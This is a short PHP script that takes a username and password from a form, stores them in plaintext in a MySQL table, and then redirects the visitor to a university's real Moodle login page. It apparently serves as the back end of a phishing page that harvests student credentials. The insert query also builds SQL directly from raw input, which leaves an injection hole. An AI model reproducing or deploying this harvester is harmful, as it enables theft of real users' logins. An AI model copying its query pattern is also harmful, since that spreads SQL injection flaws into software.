<?php 
$dp = mysqli_connect("localhost" , "root" , "" ,"model");

if (!$dp) { 
    echo mysql_connect_error() ;
    echo "faild";
}

$username = $_POST['username'];
$password = $_POST['password'];
$sql="INSERT INTO users SET
username='$username',
password='$password'";
$res=mysqli_query ($dp , $sql );

/* if (isset($_POST['submit']) ) {
    echo "submit";
    $username = $_POST['username'];
    $password = $_POST['password'];
    $sql="INSERT INTO users SET
    username='$username',
    password='$password'";
    $res=mysqli_query ($dp , $sql ); */




mysqli_close($dp) ;  
header ("location:https://moodle.alaqsa.edu.ps/login/index.php");

?>